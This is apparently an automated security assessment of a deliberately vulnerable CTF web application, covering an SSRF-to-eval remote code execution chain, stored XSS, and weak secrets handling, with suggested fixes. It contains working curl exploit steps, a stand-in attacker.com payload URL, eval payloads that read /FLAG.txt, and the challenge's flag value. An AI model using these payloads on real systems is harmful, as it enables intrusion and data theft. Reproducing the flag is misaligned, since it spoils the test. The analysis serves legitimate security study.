**Demonstrated Attack:**
```bash
# Set malicious API URL pointing to attacker-controlled server
curl "http://target/api/set?url=http://169.254.169.254/latest/meta-data/"

# Trigger SSRF by visiting /app endpoint
curl "http://target/app"
# Server fetches AWS metadata and returns it
```

---

#### **Entry Point #4: Get API URL**

**Endpoint:** `GET /api/get`  
**File:** `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-082-24/nginx/nginx.conf` (Lines 29-32)  
**Handler:** `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-082-24/nginx/conf.d/helper.js` (Lines 34-37)  
**Authentication Required:** None  
**Rate Limiting:** None  

**Code Snippet:**
```javascript
function get_api(r) {
    apiURL = fs.readFileSync(apiURLFile, 'utf8');
    r.return(200, apiURL);
}
```

**Description:**  
Returns the currently configured API URL (stored in `/tmp/apiurl`). Used by the Flask app to determine where to fetch script content.

**Security Analysis:**
- Information disclosure: Reveals internal configuration
- Leaks attacker-controlled URL if `/api/set` was exploited
- No sensitive information in default state (returns `http://flask_api:8081/script`)

**Potential Attack Vectors:**
- Reconnaissance: Attacker can verify their SSRF payload was stored
- Confirms world-writable file can be read (validates attack surface)

---

#### **Entry Point #5: Get Name Parameter**

**Endpoint:** `GET /name` OR `GET /name/get`  
**File:** `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-082-24/nginx/nginx.conf` (Lines 34-37)  
**Handler:** `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-082-24/nginx/conf.d/helper.js` (Lines 23-26)  
**Authentication Required:** None  
**Rate Limiting:** None  

**Description:**  
Returns the currently configured name parameter (stored in `/tmp/name`). Default value is 'Cocomelon'.

**Security Analysis:**
- Low-risk information disclosure
- Leaks user-supplied data if `/name/set` was used
- No sensitive data in default configuration

---

#### **Entry Point #6: Set Name Parameter (XSS Risk)**

**Endpoint:** `GET /name/set?name=<value>`  
**File:** `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-082-24/nginx/nginx.conf` (Lines 39-42)  
**Handler:** `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-082-24/nginx/conf.d/helper.js` (Lines 12-21)  
**Authentication Required:** None  
**Rate Limiting:** None  
**Input Validation:** **NONE**

**Code Snippet:**
```javascript
function set_name(r) {
    let args = r.args;
    if (args.name) {
        name = args.name;  // NO SANITIZATION
        fs.writeFileSync(nameFile, name);  // Writes to /tmp/name (777 permissions)
        r.return(200, "Hostname set to: " + name);
    } else {
        r.return(400, "Missing 'name' parameter");
    }
}
```

**Security Analysis:**
- Accepts arbitrary strings without validation
- Stores in world-writable file (`/tmp/name` with 777 permissions)
- Value rendered in Flask template at `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-082-24/app/templates/index.html` (line 43)
- XSS risk depends on Jinja2 auto-escaping configuration

**Potential Attack Vectors:**
- **Stored XSS (if auto-escaping disabled):**
  ```bash
  curl "http://target/name/set?name=<script>alert(document.cookie)</script>"
  # XSS triggers when /app endpoint is visited
  ```
- **HTML Injection:**
  ```bash
  curl "http://target/name/set?name=<h1>Defaced</h1>"
  ```

**Exploitability:** MEDIUM (depends on Jinja2 auto-escaping)
- Jinja2 enables auto-escaping by default for `.html` templates
- If disabled in Flask config, XSS is trivially exploitable
- No CSRF protection, can be triggered via malicious link

---

#### **Entry Point #7: Main Application (RCE)**

**Endpoint:** `GET /app`  
**File (NGINX):** `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-082-24/nginx/nginx.conf` (Lines 44-53)  
**File (Flask):** `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-082-24/app/app.py` (Lines 7-15)  
**Authentication Required:** None  
**Rate Limiting:** None  
**Input Validation:** **NONE**

**Code Snippet (Flask Handler):**
```python
@app.route('/app')
def home():
    api = requests.get('http://nginx/api/get').text       # Line 9: Fetch API URL
    script = requests.get(api).text                       # Line 10: SSRF - Fetch from URL
    eval_result = eval(json.loads(script)["script"])      # Line 11: RCE - Execute code
    
    name = requests.get('http://nginx/name/get').text     # Line 13
    return render_template('index.html', api=api, name=name, eval_result=eval_result)
```

**Security Analysis - CRITICAL VULNERABILITY:**

This endpoint contains the **most dangerous vulnerability in the application**: arbitrary Python code execution via `eval()`. The attack chain requires three steps:

1. **Step 1 (SSRF):** Attacker controls API URL via `/api/set?url=<attacker_url>`
2. **Step 2 (Fetch):** Flask app fetches content from attacker-controlled URL (line 10)
3. **Step 3 (RCE):** Response JSON is parsed and the `script` field is executed via `eval()` (line 11)

**Data Flow:**
```
User Input (url parameter)
  ↓
/tmp/apiurl (world-writable file)
  ↓
requests.get(api) [SSRF Sink - Line 10]
  ↓
HTTP Response from attacker server
  ↓
json.loads(script)["script"]
  ↓
eval() [RCE Sink - Line 11]
  ↓
Arbitrary Python Execution
```

**Trust Boundary Violations:**
1. **External → Internal:** Accepts API URL from untrusted user without validation
2. **Internal → External:** Makes outbound HTTP request to attacker-controlled destination
3. **External → Code Execution:** Trusts response content to be safe for eval()

**Demonstrated Exploit:**
```bash
# Host malicious payload at attacker.com/evil.json:
# {"script": "__import__('subprocess').getoutput('cat /FLAG.txt')"}

# Step 1: Set malicious API URL
curl "http://target/api/set?url=http://attacker.com/evil.json"

# Step 2: Trigger code execution
curl "http://target/app"

# Server executes: eval("__import__('subprocess').getoutput('cat /FLAG.txt')")
# Response contains flag value
```

**Exploitability:** CRITICAL - Trivial to exploit
- No authentication required
- No rate limiting (unlimited attempts)
- No input validation on any stage of the chain
- Full Python code execution capabilities

**Impact:**
- Complete server compromise
- Flag exfiltration (`/FLAG.txt`)
- Reverse shell establishment
- Internal network reconnaissance
- Data exfiltration
- Lateral movement to other Docker containers

---

#### **Entry Point #8: Flask App Health Check**

**Endpoint:** `GET /healthcheck` (on Flask app port 8080)  
**File:** `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-082-24/app/app.py` (Lines 18-20)  
**Authentication Required:** None  
**Rate Limiting:** None  

**Description:**  
Flask app health check endpoint, identical functionality to NGINX health check. Returns "OK" if the service is running.

**Security Analysis:**
- Minimal attack surface
- Used by Docker Compose health checks
- Accessible via NGINX proxy on port 8080

---

#### **Entry Point #9: Flask API Root**

**Endpoint:** `GET /` (on Flask API port 8081)  
**File:** `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-082-24/api/app.py` (Lines 6-8)  
**Authentication Required:** None  
**Rate Limiting:** None  

**Response:**
```json
{
  "message": "Welcome to the API! Please check /script endpoint for more information"
}
```

**Description:**  
API welcome message endpoint providing basic information about available endpoints.

**Security Analysis:**
- Information disclosure: Reveals existence of `/script` endpoint
- Low risk, informational only

---

#### **Entry Point #10: Flask API Health Check**

**Endpoint:** `GET /healthcheck` (on Flask API port 8081)  
**File:** `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-082-24/api/app.py` (Lines 10-12)  
**Authentication Required:** None  
**Rate Limiting:** None  

**Description:**  
Flask API health check endpoint, returns "OK" status.

---

#### **Entry Point #11: Script Endpoint (Default RCE Payload)**

**Endpoint:** `GET /script` (on Flask API port 8081)  
**File:** `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-082-24/api/app.py` (Lines 14-16)  
**Authentication Required:** None  
**Rate Limiting:** None  

**Code Snippet:**
```python
@api.route('/script')
def get_script():
    return {"script": "'OK ' * 4"}
```

**Description:**  
Returns a JSON response containing a Python script string. This is the **default endpoint** that the Flask app fetches from if the API URL hasn't been modified. The script is a benign Python expression that repeats the string 'OK ' four times.

**Security Analysis:**
- Designed to demonstrate safe usage of the architecture
- Default behavior: `eval("'OK ' * 4")` returns "OK OK OK OK "
- Becomes dangerous when attacker modifies API URL via `/api/set`

**In Default Configuration:**
```
/app endpoint → fetches http://flask_api:8081/script
             → receives {"script": "'OK ' * 4"}
             → executes eval("'OK ' * 4")
             → renders "OK OK OK OK " in template (safe)
```

**After SSRF Attack:**
```
Attacker sets url=http://attacker.com/malicious
/app endpoint → fetches http://attacker.com/malicious
             → receives {"script": "__import__('os').system('cat /FLAG.txt')"}
             → executes eval() with malicious payload (RCE)
```

---

### Internal Service Communication

**Service Architecture:**

The application uses a Docker internal network for communication between three services:

```
┌──────────────────────────────────────────────────────┐
│  Docker Internal Network (172.x.x.x/16)              │
│                                                       │
│  ┌────────────┐      ┌────────────┐      ┌────────┐ │
│  │   NGINX    │──────│  flask_app │──────│flask_api│ │
│  │  (gateway) │      │  (main)    │      │  (API)  │ │
│  └────────────┘      └────────────┘      └────────┘ │
│        ↑                                              │
│        │ Ports 80, 8080, 8081                         │
└────────┼──────────────────────────────────────────────┘
         │
    Internet/User
```

**Trust Relationships:**

1. **NGINX → Flask App (flask_app:8080)**
   - **Direction:** Unidirectional proxy
   - **Protocol:** HTTP (no TLS)
   - **Authentication:** NONE
   - **Trust Assumption:** NGINX trusts all responses from flask_app
   - **Configuration:** `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-082-24/nginx/nginx.conf` (lines 44-53, 55-69)
   - **Security Issue:** No mutual TLS, no service authentication, cleartext communication

2. **NGINX → Flask API (flask_api:8081)**
   - **Direction:** Unidirectional proxy
   - **Protocol:** HTTP (no TLS)
   - **Authentication:** NONE
   - **Trust Assumption:** NGINX trusts all responses from flask_api
   - **Configuration:** `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-082-24/nginx/nginx.conf` (lines 71-85)
   - **Security Issue:** No service-to-service authentication

3. **Flask App → NGINX (Internal API Calls)**
   - **Direction:** Bidirectional - Flask app calls back to NGINX
   - **Endpoints Called:**
     - `http://nginx/api/get` (fetches API URL from `/tmp/apiurl`)
     - `http://nginx/name/get` (fetches name from `/tmp/name`)
   - **Protocol:** HTTP (no TLS)
   - **Authentication:** NONE
   - **Trust Assumption:** Flask app trusts NGINX responses without validation
   - **Security Issue:** Circular dependency creates attack amplification (NGINX → Flask → NGINX)

4. **Flask App → External URLs (SSRF Vulnerability)**
   - **Direction:** Outbound HTTP requests to attacker-controlled destinations
   - **Trigger:** User-supplied URL via `/api/set` endpoint
   - **Code Location:** `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-082-24/app/app.py` (line 10)
   - **Trust Assumption:** Flask app trusts all HTTP response content (VIOLATED)
   - **Security Issue:** No URL validation, no allow-listing, enables SSRF and RCE

**Security Assumptions (All Violated):**

| Assumption | Reality | Consequence |
|------------|---------|-------------|
| "NGINX filters malicious input" | NGINX accepts all input without validation | SSRF and XSS possible |
| "Flask services only receive trusted data" | Flask receives attacker-controlled URLs | RCE via eval() |
| "Internal network is secure" | Services communicate over HTTP without auth | Network sniffing, MITM attacks |
| "API responses are safe" | Responses can contain malicious Python code | eval() executes arbitrary code |
| "Configuration files are protected" | /tmp files have 777 permissions | Any process can modify config |

**Docker DNS Resolution:**

- **DNS Server:** 127.0.0.11 (Docker embedded DNS)
- **TTL:** 30 seconds (default Docker DNS cache)
- **Service Discovery:** Hostname-based (`flask_app`, `flask_api`, `nginx`)
- **Security Issue:** No DNSSEC, vulnerable to DNS spoofing within container network

**Network Segmentation Analysis:**

- **External Network:** Internet → Port 80 (NGINX)
- **DMZ/Gateway:** NGINX container
- **Internal Network:** Flask app and Flask API containers
- **Security Issue:** No true network segmentation - all services on same Docker network
- **Missing Controls:** No firewall rules, no network policies, no egress filtering

**Attack Amplification via Circular Dependency:**

```
Attacker → /api/set?url=<evil>
         ↓
      NGINX (stores in /tmp/apiurl)
         ↓
      /app endpoint (proxied to flask_app)
         ↓
      Flask app → HTTP to nginx/api/get (retrieves evil URL)
         ↓
      Flask app → HTTP to <evil> (SSRF)
         ↓
      eval() executes response (RCE)
```

The circular dependency (Flask → NGINX → Flask) creates an attack amplification effect where malicious input persists and is reused across multiple request cycles.

---

### Input Validation Patterns

**Global Input Validation Status: COMPLETELY ABSENT**

The application has **ZERO input validation** mechanisms across all network-accessible endpoints. Every user-supplied parameter is accepted without sanitization, encoding, or validation.

#### **NGINX NJS Input Handling (Insecure)**

**File:** `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-082-24/nginx/conf.d/helper.js`

**Endpoint #1: `/api/set?url=<value>`** (Lines 39-48)
```javascript
function set_api(r) {
    let args = r.args;
    if (args.url) {
        apiURL = args.url;  // ❌ NO VALIDATION
        fs.writeFileSync(apiURLFile, apiURL);  // ❌ Direct write to filesystem
        r.return(200, "API URL set to: " + apiURL);
    }
}
```

**Missing Validations:**
- ❌ No URL format validation (accepts any string)
- ❌ No protocol allow-listing (should restrict to http/https)
- ❌ No hostname allow-listing (should restrict to known safe domains)
- ❌ No IP address validation (doesn't block internal IPs: 10.0.0.0/8, 192.168.0.0/16, 169.254.169.254)
- ❌ No path traversal protection
- ❌ No length limits (could cause buffer issues)
- ❌ No character escaping for filesystem operations

**Endpoint #2: `/name/set?name=<value>`** (Lines 12-21)
```javascript
function set_name(r) {
    let args = r.args;
    if (args.name) {
        name = args.name;  // ❌ NO SANITIZATION
        fs.writeFileSync(nameFile, name);  // ❌ Direct write to filesystem
        r.return(200, "Hostname set to: " + name);
    }
}
```

**Missing Validations:**
- ❌ No HTML encoding (enables XSS if Jinja2 auto-escaping disabled)
- ❌ No JavaScript escaping
- ❌ No SQL escaping (not applicable, no database)
- ❌ No length limits
- ❌ No character allow-listing (should restrict to alphanumeric + safe chars)
- ❌ No newline/null byte filtering

#### **Flask Application Input Handling (Insecure)**

**File:** `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-082-24/app/app.py`

**Critical Code Path: `/app` Endpoint** (Lines 7-15)
```python
@app.route('/app')
def home():
    api = requests.get('http://nginx/api/get').text  # Gets attacker-controlled URL
    script = requests.get(api).text                  # ❌ NO URL VALIDATION - SSRF
    eval_result = eval(json.loads(script)["script"]) # ❌ NO CONTENT VALIDATION - RCE
    
    name = requests.get('http://nginx/name/get').text
    return render_template('index.html', api=api, name=name, eval_result=eval_result)
```

**Missing Validations:**

**Line 10 (SSRF Vulnerability):**
- ❌ No URL validation before `requests.get(api)`
- ❌ No allow-listing of permitted destinations
- ❌ No timeout configuration (could hang indefinitely)
- ❌ No response size limits (could cause memory exhaustion)
- ❌ No redirect following limits (default allows unlimited redirects)
- ❌ No protocol validation (accepts file://, gopher://, etc.)

**Line 11 (RCE Vulnerability):**
- ❌ No JSON schema validation
- ❌ No validation that `script` field exists before access
- ❌ No validation that `script` contains safe Python code
- ❌ No use of `ast.literal_eval()` (safer alternative)
- ❌ Direct use of `eval()` without sandboxing
- ❌ No execution timeout (malicious code could run indefinitely)

**Line 15 (Template Injection Risk):**
- ❌ No output encoding before template rendering
- ❌ Relies on Jinja2 auto-escaping (not explicitly enforced)
- ❌ Variables `api`, `name`, `eval_result` rendered without sanitization

#### **Recommended Input Validation (Not Implemented)**

**For URL Parameters (`/api/set?url=`):**
```python
# SHOULD IMPLEMENT (currently missing):
import urllib.parse
from ipaddress import ip_address, ip_network

def validate_url(url):
    # 1. Parse URL
    parsed = urllib.parse.urlparse(url)
    
    # 2. Allow-list protocols
    if parsed.scheme not in ['http', 'https']:
        raise ValueError("Invalid protocol")
    
    # 3. Allow-list domains
    allowed_domains = ['flask_api', 'trusted-api.example.com']
    if parsed.hostname not in allowed_domains:
        raise ValueError("Domain not allowed")
    
    # 4. Block internal IPs
    ip = ip_address(parsed.hostname)
    internal_networks = [
        ip_network('10.0.0.0/8'),
        ip_network('172.16.0.0/12'),
        ip_network('192.168.0.0/16'),
        ip_network('169.254.0.0/16'),  # Cloud metadata
        ip_network('127.0.0.0/8'),     # Localhost
    ]
    for network in internal_networks:
        if ip in network:
            raise ValueError("Internal IP not allowed")
    
    return url
```

**For String Parameters (`/name/set?name=`):**
```python
# SHOULD IMPLEMENT (currently missing):
import html
import re

def validate_name(name):
    # 1. Length limit
    if len(name) > 50:
        raise ValueError("Name too long")
    
    # 2. Character allow-listing
    if not re.match(r'^[a-zA-Z0-9\s\-_]+$', name):
        raise ValueError("Invalid characters")
    
    # 3. HTML encoding (defense in depth)
    return html.escape(name)
```

**For eval() Prevention:**
```python
# SHOULD REPLACE eval() with:
import ast

def safe_eval(code_string):
    # Only allows literals: strings, numbers, tuples, lists, dicts, booleans, None
    try:
        return ast.literal_eval(code_string)
    except (ValueError, SyntaxError):
        raise ValueError("Invalid literal expression")

# OR better yet, remove eval() entirely and use a safe operation enum:
ALLOWED_OPERATIONS = {
    'repeat_ok': lambda: 'OK ' * 4,
    'get_timestamp': lambda: str(time.time()),
}

def execute_safe_operation(operation_name):
    if operation_name not in ALLOWED_OPERATIONS:
        raise ValueError("Operation not allowed")
    return ALLOWED_OPERATIONS[operation_name]()
```

---

### Background Processing

**Background Job Status: NOT APPLICABLE**

The application does not implement any asynchronous background processing mechanisms. All operations are synchronous and handled within HTTP request-response cycles.

**No Background Job Systems Detected:**
- ❌ No Celery task queues
- ❌ No Redis queue (RQ)
- ❌ No Apache Kafka message streams
- ❌ No RabbitMQ message queues
- ❌ No scheduled cron jobs in application code
- ❌ No asyncio/async/await patterns in Python code

**Docker Health Checks (Not Background Jobs):**

The only "background" processes are Docker health checks, which are orchestrated by Docker itself, not the application:

**Configuration:** `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-082-24/docker-compose.yml` (lines 10-12, 31-33, 47-49)
```yaml
healthcheck:
  test: ["CMD", "curl", "-f", "http://localhost/healthcheck"]
  interval: 10s
  timeout: 1s
  retries: 5
```

**Security Analysis:**
- Health checks run with container privileges (same as main application)
- No privilege separation
- Health check endpoints are publicly accessible (no authentication)
- Not exploitable as background jobs since they're Docker-managed

**If Background Jobs Were Implemented (Theoretical Analysis):**

The following security controls would be missing:
- Job authentication (validating job source)
- Job privilege isolation (running jobs with minimal permissions)
- Rate limiting on job creation
- Job input validation
- Job timeout enforcement
- Dead letter queues for failed jobs
- Job audit logging

---

## 6. Infrastructure & Operational Security

### Secrets Management

**Secrets Management Status: CRITICALLY INSECURE**

The application stores secrets in plaintext across multiple locations without encryption, rotation, or access controls. This violates all industry best practices for secret management.

#### **Secret #1: CTF Flag (Critical Exposure)**

**Storage Locations:**

1. **Git Repository (Plaintext .env file):**
   - **File:** `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-082-24/.env` (line 1)
   - **Content:** `FLAG="flag{6a221da4-597c-4dea-98c2-4f2417dd77e7}"`
   - **Exposure:** Committed to version control, visible in git history
   - **Risk:** Anyone with repository access can read the flag
   - **Mitigation:** Should use `.gitignore` for `.env` files

2. **Docker Image Layer (Build-Time Embedding):**
   - **File:** `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-082-24/app/Dockerfile` (lines 11-13)
   - **Method:**
     ```dockerfile
     ARG FLAG
     RUN echo -n $FLAG > /FLAG.txt
     ```
   - **Exposure:** Flag written to image layer, visible via `docker history <image_id>`
   - **Risk:** Anyone with image access can extract flag from layers
   - **Mitigation:** Should use Docker secrets or multi-stage builds

3. **Container Filesystem (Runtime Storage):**
   - **Location:** `/FLAG.txt` inside flask_app container
   - **Permissions:** Standard file permissions (likely 644)
   - **Protection:** NONE - plaintext file, no encryption
   - **Access:** Readable via RCE vulnerability

**Attack Scenarios:**

1. **Git History Extraction:**
   ```bash
   git clone <repo_url>
   cat .env  # Flag exposed
   ```

2. **Docker Image Layer Inspection:**
   ```bash
   docker pull <image>
   docker history <image>  # Shows RUN echo $FLAG > /FLAG.txt
   docker save <image> -o image.tar
   tar -xf image.tar
   # Flag extractable from layer filesystem
   ```

3. **Runtime Exploitation:**
   ```bash
   # Via RCE vulnerability
   curl "http://target/api/set?url=http://attacker.com/payload"
   # payload: {"script": "open('/FLAG.txt').read()"}
   curl "http://target/app"  # Returns flag
   ```

#### **Secret Rotation: NOT IMPLEMENTED**

- No mechanism to rotate the flag without rebuilding Docker images
- No secret versioning
- No secret expiration policies
- Static secret used indefinitely

### Configuration Security

**Environment Separation: NOT IMPLEMENTED**

The application does not implement environment-specific configurations for development, staging, and production environments.

**Configuration File Locations:**

1. **Environment Variables (.env):**
   - **File:** `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-082-24/.env`
   - **Issues:**
     - Single environment (no dev/staging/prod separation)
     - Committed to version control
     - No environment variable validation

2. **Docker Compose Configuration:**
   - **File:** `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-082-24/docker-compose.yml`
   - **Issues:**
     - Single docker-compose.yml (should have docker-compose.prod.yml, docker-compose.dev.yml)
     - Build-time secrets passed as ARG (insecure)
     - No secret management integration

3. **NGINX Configuration:**
   - **File:** `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-082-24/nginx/nginx.conf`
   - **Issues:**
     - No environment-specific config
     - Debug settings same for all environments
     - No production hardening

4. **Flask Application Configuration:**
   - **Files:** 
     - `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-082-24/app/app.py` (line 23)
     - `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-082-24/api/app.py` (line 19)
   - **Issues:**
     - Hardcoded `debug=True` in source code (should be environment variable)
     - No config class (should use Flask config objects)
     - Same settings for all environments

**Secret Handling Issues:**

| Secret Type | Current Storage | Secure Alternative |
|-------------|-----------------|-------------------|
| FLAG | .env file (plaintext) | HashiCorp Vault, AWS Secrets Manager |
| API URLs | /tmp files (777 permissions) | Environment variables, secure KV store |
| Session Keys | Not used (should exist) | Runtime secret generation, vault storage |
| Database Credentials | N/A (no database) | Vault dynamic secrets, IAM auth |

**Recommended Configuration Architecture (Not Implemented):**

```python
# config.py (SHOULD IMPLEMENT)
import os

class Config:
    SECRET_KEY = os.environ.get('SECRET_KEY') or 'dev-key-change-me'
    DEBUG = False
    TESTING = False

class DevelopmentConfig(Config):
    DEBUG = True
    # Use local services

class ProductionConfig(Config):
    # Require secret key from environment
    SECRET_KEY = os.environ['SECRET_KEY']  # Fail if not set
    # HTTPS enforcement
    SESSION_COOKIE_SECURE = True
    SESSION_COOKIE_HTTPONLY = True
    SESSION_COOKIE_SAMESITE = 'Strict'

class TestingConfig(Config):
    TESTING = True

config = {
    'development': DevelopmentConfig,
    'production': ProductionConfig,
    'testing': TestingConfig,
    'default': DevelopmentConfig
}
```

### Security Headers Configuration

**Infrastructure Security Headers: COMPLETELY MISSING**

No security headers are configured at any layer of the application stack. All standard web application security headers are absent.

**NGINX Configuration Analysis:**

**File:** `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-082-24/nginx/nginx.conf`

**Current Proxy Headers (Lines 47-52, 61-67, 76-82):**
```nginx
proxy_set_header X-Real-IP $remote_addr;
proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;
proxy_set_header X-Forwarded-Proto $scheme;
```
**Note:** These are request forwarding headers, NOT response security headers.

**Missing Security Headers:**

1. **Strict-Transport-Security (HSTS): MISSING**
   - **Purpose:** Force HTTPS connections, prevent SSL stripping
   - **Should be:** `add_header Strict-Transport-Security "max-age=31536000; includeSubDomains; preload" always;`
   - **Location to add:** NGINX server block (after line 13)
   - **Impact:** Users vulnerable to man-in-the-middle attacks (HTTP only, no TLS)

2. **Content-Security-Policy (CSP): MISSING**
   - **Purpose:** Prevent XSS attacks by controlling resource loading
   - **Should be:** `add_header Content-Security-Policy "default-src 'self'; script-src 'self'; style-src 'self'" always;`
   - **Impact:** XSS attacks not mitigated, inline scripts allowed

3. **X-Frame-Options: MISSING**
   - **Purpose:** Prevent clickjacking attacks
   - **Should be:** `add_header X-Frame-Options "DENY" always;`
   - **Impact:** Application can be embedded in iframes (clickjacking risk)

4. **X-Content-Type-Options: MISSING**
   - **Purpose:** Prevent MIME type sniffing
   - **Should be:** `add_header X-Content-Type-Options "nosniff" always;`
   - **Impact:** Browsers may misinterpret content types

5. **Referrer-Policy: MISSING**
   - **Purpose:** Control referrer information leakage
   - **Should be:** `add_header Referrer-Policy "strict-origin-when-cross-origin" always;`
   - **Impact:** Referrer leaks may expose sensitive URLs

6. **Permissions-Policy: MISSING**
   - **Purpose:** Control browser features (camera, microphone, etc.)
   - **Should be:** `add_header Permissions-Policy "camera=(), microphone=(), geolocation=()" always;`
   - **Impact:** No control over browser feature access

**Cache-Control Headers: MISSING**

**File:** `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-082-24/nginx/nginx.conf`

No cache control headers are configured. This can lead to:
- Sensitive data cached in browsers
- Stale content served to users
- Proxy caches storing sensitive responses

**Should implement:**
```nginx
# For static assets (HTML, JS, CSS):
location ~* \.(html|js|css)$ {
    add_header Cache-Control "no-cache, no-store, must-revalidate" always;
    add_header Pragma "no-cache" always;
    add_header Expires "0" always;
}

# For API endpoints:
location /api/ {
    add_header Cache-Control "no-store, no-cache, must-revalidate" always;
}
```

**Infrastructure Security Header Search Results:**

Searched for infrastructure configuration defining security headers in:
- NGINX configuration files (nginx.conf, conf.d/*.conf)
- Kubernetes Ingress manifests (none found)
- CDN configuration files (none found)
- API Gateway configs (none found)

**No infrastructure-level security header configurations detected.**

### External Dependencies

**Third-Party Service Dependencies:**

The application has minimal external dependencies. Only standard library and framework components are used.

**Python Package Dependencies:**

1. **Flask App Dependencies:**
   - **File:** `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-082-24/app/requirements.txt`
   - **Content:**
     ```
     Flask==3.0.3
     requests
     ```
   - **Security Issues:**
     - `requests` library version not pinned (could pull vulnerable versions)
     - No dependency vulnerability scanning detected
     - No automated dependency updates (Dependabot, Renovate)

2. **Flask API Dependencies:**
   - **File:** `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-082-24/api/requirements.txt`
   - **Content:**
     ```
     Flask==3.0.3
     ```

**External Service Integrations: NONE**

- No cloud service SDKs (AWS, GCP, Azure)
- No payment gateways (Stripe, PayPal)
- No authentication providers (Auth0, Okta)
- No monitoring services (Datadog, New Relic)
- No email services (SendGrid, Mailgun)
- No SMS services (Twilio)

**Docker Base Images:**

1. **Python Base Image:**
   - **Image:** `python:3.8-slim` (Dockerfiles for app and api)
   - **Security Issue:** Python 3.8 reached EOL October 2024, no security updates
   - **Recommendation:** Upgrade to Python 3.11+ or 3.12

2. **NGINX Base Image:**
   - **Image:** `nginx:alpine` with `nginx-module-njs`
   - **Dockerfile:** `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-082-24/nginx/Dockerfile`
   - **Issue:** Alpine version not pinned, could pull different versions

**Security Implications of External Dependencies:**

- **Supply Chain Risk:** Low (minimal dependencies)
- **Vulnerability Surface:** Medium (requests library SSRF capability, Python 3.8 EOL)
- **Dependency Confusion Attacks:** Low risk (no private package repos)
- **Typosquatting Risk:** Low (only well-known packages)

**Missing Dependency Security Controls:**
- No Software Bill of Materials (SBOM) generation
- No dependency scanning (Snyk, OWASP Dependency-Check)
- No license compliance checking
- No vulnerability monitoring for Docker base images

### Monitoring & Logging

**Security Monitoring Status: NOT IMPLEMENTED**

The application has **NO security monitoring, logging, or observability infrastructure**. Security events are not captured, logged, or alerted.

**Logging Implementation: MINIMAL**

**Flask Application Logging:**
- **Default Flask logging:** Logs HTTP requests to stdout (format: `127.0.0.1 - - [timestamp] "GET /app HTTP/1.1" 200 -`)
- **No structured logging:** No JSON logs, no log levels
- **No security event logging:** Doesn't log authentication failures, authorization denials, input validation failures

**NGINX Logging:**
- **Default Access Logs:** `/var/log/nginx/access.log` (not persisted outside container)
- **Default Error Logs:** `/var/log/nginx/error.log` (not persisted outside container)
- **Format:** Combined log format (basic HTTP request logging)

**Missing Logging:**

No logging for security-relevant events:
- ❌ Failed authentication attempts (N/A - no auth)
- ❌ Authorization failures (N/A - no authz)
- ❌ Input validation failures (N/A - no validation)
- ❌ SSRF attempt detection
- ❌ eval() code execution logging
- ❌ Configuration changes (`/api/set`, `/name/set`)
- ❌ Rate limiting violations (N/A - no rate limiting)
- ❌ File system modifications

**Sensitive Data in Logs:**

**Critical Issue:** If logging were implemented without sanitization, the following sensitive data would be logged:
- API URLs (including attacker-controlled SSRF payloads)
- eval() execution results (could contain secrets)
- Flag value if read via RCE

**Example of dangerous logging (if implemented):**
```python
# INSECURE - Would log sensitive data:
logger.info(f"Executing script: {script}")  # Logs attacker payload
logger.info(f"Eval result: {eval_result}")  # Could log flag value
```

**Security Information and Event Management (SIEM): NOT IMPLEMENTED**

- No SIEM integration (Splunk, ELK Stack, Azure Sentinel)
- No log aggregation (Fluentd, Logstash)
- No centralized log storage
- Logs only stored in ephemeral containers (lost on restart)

**Alerting & Monitoring: NOT IMPLEMENTED**

- No alerting system (PagerDuty, Opsgenie)
- No anomaly detection
- No intrusion detection system (IDS)
- No Web Application Firewall (WAF)
- No rate limit violation alerts

**Audit Logging: NOT IMPLEMENTED**

No audit trail for:
- Who modified `/tmp/apiurl` or `/tmp/name`
- When eval() was executed
- What code was executed
- Source IP addresses of attackers

**Recommended Monitoring (Not Implemented):**

1. **Security Event Logging:**
   ```python
   import logging
   import json
   
   security_logger = logging.getLogger('security')
   
   # Log SSRF attempts
   security_logger.warning(json.dumps({
       'event': 'ssrf_attempt',
       'url': sanitized_url,
       'source_ip': request.remote_addr,
       'timestamp': datetime.utcnow().isoformat()
   }))
   ```

2. **SIEM Integration:**
   - Ship logs to ELK Stack (Elasticsearch, Logstash, Kibana)
   - Configure alerts for suspicious patterns
   - Retain logs for forensic analysis

3. **Real-Time Monitoring:**
   - Application Performance Monitoring (APM)
   - Error rate tracking
   - Latency monitoring
   - Resource utilization alerts

4. **Security Dashboards:**
   - Failed requests by endpoint
   - Anomalous request patterns
   - Geographic distribution of requests
   - Top error codes

---

## 7. Overall Codebase Indexing

The XBEN-082-24 codebase is a deliberately minimal CTF challenge implementing a microservices architecture with intentional security vulnerabilities. The repository consists of **15 files (excluding .git directory) totaling approximately 196 lines of core application logic**. The codebase is organized into three primary service directories (`nginx`, `app`, `api`) with containerization configurations at the root level. This compact structure belies the severity of its security flaws, demonstrating that significant vulnerabilities can exist in small codebases.

